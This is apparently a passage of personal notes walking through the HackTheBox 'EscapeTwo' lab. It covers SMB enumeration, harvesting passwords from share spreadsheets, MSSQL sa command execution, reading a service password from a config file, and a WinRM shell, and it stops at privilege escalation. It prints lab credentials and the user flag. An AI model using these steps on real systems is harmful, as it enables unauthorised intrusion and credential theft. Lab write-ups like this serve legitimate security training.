
https://freedium.cfd/https://infosecwriteups.com/hacking-escapetwo-on-hackthebox-a-step-by-step-oscp-journey-6725de2a8235



default creds giving by the box  

account: rose / KxEPkKe6R8su

kicking out some nmap scan 

```
nmap -p- -sV -sS -Pn -v -oN nmap1.txt -T5 10.10.11.51

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-01-28 02:14:07Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49689/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49691/tcp open  msrpc         Microsoft Windows RPC
49706/tcp open  msrpc         Microsoft Windows RPC
49722/tcp open  msrpc         Microsoft Windows RPC
49743/tcp open  msrpc         Microsoft Windows RPC
49812/tcp open  msrpc         Microsoft Windows RPC
```

scanning ldap with netexec 

```
netexec smb sequel.htb0 -u "rose" -p "KxEPkKe6R8su" --users 
SMB         10.10.11.51     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:sequel.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.51     445    DC01             [+] sequel.htb\rose:KxEPkKe6R8su 
SMB         10.10.11.51     445    DC01             -Username-                    -Last PW Set-       -BadPW- -Description-                                           
SMB         10.10.11.51     445    DC01             Administrator                 2024-06-08 16:32:20 1       Built-in account for administering the computer/domain 
SMB         10.10.11.51     445    DC01             Guest                         2024-12-25 14:44:53 1       Built-in account for guest access to the computer/domain
SMB         10.10.11.51     445    DC01             krbtgt                        2024-06-08 16:40:23 0       Key Distribution Center Service Account 
SMB         10.10.11.51     445    DC01             michael                       2024-06-08 16:47:37 0        
SMB         10.10.11.51     445    DC01             ryan                          2024-06-08 16:55:45 0        
SMB         10.10.11.51     445    DC01             oscar                         2024-06-08 16:56:36 0        
SMB         10.10.11.51     445    DC01             sql_svc                       2024-06-09 07:58:42 0        
SMB         10.10.11.51     445    DC01             rose                          2024-12-25 14:44:54 0        
SMB         10.10.11.51     445    DC01             ca_svc                        2025-01-28 10:07:29 0        
SMB         10.10.11.51     445    DC01             [*] Enumerated 9 local users: SEQUEL

netexec smb sequel.htb0 -u "rose" -p "KxEPkKe6R8su" --shares
SMB         10.10.11.51     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:sequel.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.51     445    DC01             [+] sequel.htb\rose:KxEPkKe6R8su 
SMB         10.10.11.51     445    DC01             [*] Enumerated shares
SMB         10.10.11.51     445    DC01             Share           Permissions     Remark
SMB         10.10.11.51     445    DC01             -----           -----------     ------
SMB         10.10.11.51     445    DC01             Accounting Department READ            
SMB         10.10.11.51     445    DC01             ADMIN$                          Remote Admin
SMB         10.10.11.51     445    DC01             C$                              Default share
SMB         10.10.11.51     445    DC01             IPC$            READ            Remote IPC
SMB         10.10.11.51     445    DC01             NETLOGON        READ            Logon server share 
SMB         10.10.11.51     445    DC01             SYSVOL          READ            Logon server share 
SMB         10.10.11.51     445    DC01             Users           READ            
netexec smb sequel.htb0 -u "rose" -p "KxEPkKe6R8su" --computers 
SMB         10.10.11.51     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:sequel.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.51     445    DC01             [+] sequel.htb\rose:KxEPkKe6R8su 
SMB         10.10.11.51     445    DC01             [+] Enumerated domain computer(s)
SMB         10.10.11.51     445    DC01             sequel.htb\DC01$   

```

checking shares 

```
smbclient  "//sequel.htb0/Accounting Department" -U SEQUEL\\rose   
smb: \> ls 
  .                                   D        0  Sun Jun  9 06:52:21 2024
  ..                                  D        0  Sun Jun  9 06:52:21 2024
  accounting_2024.xlsx                A    10217  Sun Jun  9 06:14:49 2024
  accounts.xlsx                       A     6780  Sun Jun  9 06:52:07 2024
```

iterresting files 
creds for sql  in accounts.xlsx 
```
Angela Martin |angela@sequel.htb | angela | 0fwz7Q4mSpurIt99 |
Oscar Martinez | oscar@sequel.htb |oscar | 86LxLBMgEWaKUnBG |
|Kevin Malone | kevin@sequel.htb | kevin | Md9Wlq1E5bZnVDVo |
|NULL NULL | sa@sequel.htb | sa | MSSQLP@ssw0rd! |
```

accounting_2024.xlsx
```
9/6/2024|1001|Dunder Mifflin|Office Supplies|150$\|01/15/202|Paid
23/08/2024|1002|Business Consultancy\|Consulting|500$|01/30/202|Unpaid|Follow up
7/10/2024|1003|Windows Server License|Software|300$|02/05/202|Paid
```

nothing interresting but we get sql accounts ..

trying them against the sql server 

only "sa" worked 

```
netexec mssql 10.10.11.51  -u 'sa' -p 'MSSQLP@ssw0rd!' --local-auth  --module mssql_priv      
MSSQL       10.10.11.51     1433   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:sequel.htb)
MSSQL       10.10.11.51     1433   DC01             [+] DC01\sa:MSSQLP@ssw0rd! (Pwn3d!)
MSSQL_PRIV  10.10.11.51     1433   DC01             [+] sa is already a sysadmin
```

sa is already a sysadmin 
that mean we have a command injection in the server 

```
netexec mssql 10.10.11.51  -u 'sa' -p 'MSSQLP@ssw0rd!' --local-auth   -x "dir C:Users"                   
MSSQL       10.10.11.51     1433   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:sequel.htb)
MSSQL       10.10.11.51     1433   DC01             [+] DC01\sa:MSSQLP@ssw0rd! (Pwn3d!)
MSSQL       10.10.11.51     1433   DC01             [+] Executed command via mssqlexec
MSSQL       10.10.11.51     1433   DC01             Volume in drive C has no label.
MSSQL       10.10.11.51     1433   DC01             Volume Serial Number is 3705-289D
MSSQL       10.10.11.51     1433   DC01             Directory of C:\Windows\system32
MSSQL       10.10.11.51     1433   DC01             File Not Found

netexec mssql 10.10.11.51  -u 'sa' -p 'MSSQLP@ssw0rd!' --local-auth   -x "whoami"
MSSQL       10.10.11.51     1433   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:sequel.htb)
MSSQL       10.10.11.51     1433   DC01             [+] DC01\sa:MSSQLP@ssw0rd! (Pwn3d!)
MSSQL       10.10.11.51     1433   DC01             [+] Executed command via mssqlexec
MSSQL       10.10.11.51     1433   DC01             sequel\sql_svc
```

trying with sql querys 

```
netexec mssql 10.10.11.51  -u 'sa' -p 'MSSQLP@ssw0rd!' --local-auth -q "SELECT  @@version" 
MSSQL       10.10.11.51     1433   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:sequel.htb)
MSSQL       10.10.11.51     1433   DC01             [+] DC01\sa:MSSQLP@ssw0rd! (Pwn3d!)
MSSQL       10.10.11.51     1433   DC01             Microsoft SQL Server 2019 (RTM) - 15.0.2000.5 (X64) 
    Sep 24 2019 13:48:23 
    Copyright (C) 2019 Microsoft Corporation
    Express Edition (64-bit) on Windows Server 2019 Standard 10.0 <X64> (Build 17763: ) (Hypervisor)
```


```
netexec mssql sequel.htb0  -u 'sa' -p 'MSSQLP@ssw0rd!' --local-auth   -x "type C:\SQL2019\ExpressAdv_enu\sql-Configuration.INI"  
MSSQL       10.10.11.51     1433   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:sequel.htb)
MSSQL       10.10.11.51     1433   DC01             [+] DC01\sa:MSSQLP@ssw0rd! (Pwn3d!)
MSSQL       10.10.11.51     1433   DC01             [+] Executed command via mssqlexec
MSSQL       10.10.11.51     1433   DC01             [OPTIONS]
MSSQL       10.10.11.51     1433   DC01             ACTION="Install"
MSSQL       10.10.11.51     1433   DC01             QUIET="True"
MSSQL       10.10.11.51     1433   DC01             FEATURES=SQL
MSSQL       10.10.11.51     1433   DC01             INSTANCENAME="SQLEXPRESS"
MSSQL       10.10.11.51     1433   DC01             INSTANCEID="SQLEXPRESS"
MSSQL       10.10.11.51     1433   DC01             RSSVCACCOUNT="NT Service\ReportServer$SQLEXPRESS"
MSSQL       10.10.11.51     1433   DC01             AGTSVCACCOUNT="NT AUTHORITY\NETWORK SERVICE"
MSSQL       10.10.11.51     1433   DC01             AGTSVCSTARTUPTYPE="Manual"
MSSQL       10.10.11.51     1433   DC01             COMMFABRICPORT="0"
MSSQL       10.10.11.51     1433   DC01             COMMFABRICNETWORKLEVEL=""0"
MSSQL       10.10.11.51     1433   DC01             COMMFABRICENCRYPTION="0"
MSSQL       10.10.11.51     1433   DC01             MATRIXCMBRICKCOMMPORT="0"
MSSQL       10.10.11.51     1433   DC01             SQLSVCSTARTUPTYPE="Automatic"
MSSQL       10.10.11.51     1433   DC01             FILESTREAMLEVEL="0"
MSSQL       10.10.11.51     1433   DC01             ENABLERANU="False"
MSSQL       10.10.11.51     1433   DC01             SQLCOLLATION="SQL_Latin1_General_CP1_CI_AS"
MSSQL       10.10.11.51     1433   DC01             SQLSVCACCOUNT="SEQUEL\sql_svc"
MSSQL       10.10.11.51     1433   DC01             SQLSVCPASSWORD="WqSZAF6CysDQbGb3"
MSSQL       10.10.11.51     1433   DC01             SQLSYSADMINACCOUNTS="SEQUEL\Administrator"
MSSQL       10.10.11.51     1433   DC01             SECURITYMODE="SQL"
MSSQL       10.10.11.51     1433   DC01             SAPWD="MSSQLP@ssw0rd!"
MSSQL       10.10.11.51     1433   DC01             ADDCURRENTUSERASSQLADMIN="False"
MSSQL       10.10.11.51     1433   DC01             TCPENABLED="1"
MSSQL       10.10.11.51     1433   DC01             NPENABLED="1"
MSSQL       10.10.11.51     1433   DC01             BROWSERSVCSTARTUPTYPE="Automatic"
MSSQL       10.10.11.51     1433   DC01             IAcceptSQLServerLicenseTerms=True
```

the creds for sql_svc
 
```
SQLSVCACCOUNT="SEQUEL\sql_svc
SQLSVCPASSWORD="WqSZAF6CysDQbGb3
```

trying to find ryan a password on the winrm 

```
netexec winrm sequel.htb0  -u 'ryan' -p ~/repo/Seclist/Passwords/rockyou.txt  
```

ryan:WqSZAF6CysDQbGb3

```
evil-winrm -i sequel.htb0 -u 'ryan' -p 'WqSZAF6CysDQbGb3'

Evil-WinRM shell v3.7

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\ryan\Documents> 
```


found user flag 
```
Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        1/27/2025   8:02 PM             34 user.txt

*Evil-WinRM* PS C:\Users\ryan\Desktop> cat user.txt
c515575b843720e73ba9a56a5cfcb38e
*Evil-WinRM* PS C:\Users\ryan\Desktop> 
```


# PrivilageEscallation 

privi escalation time now ,  theres a folder called gg in the document folder  and theres some tools like *BloodHound* 

lets try them with wat we aquired 








[[machines]]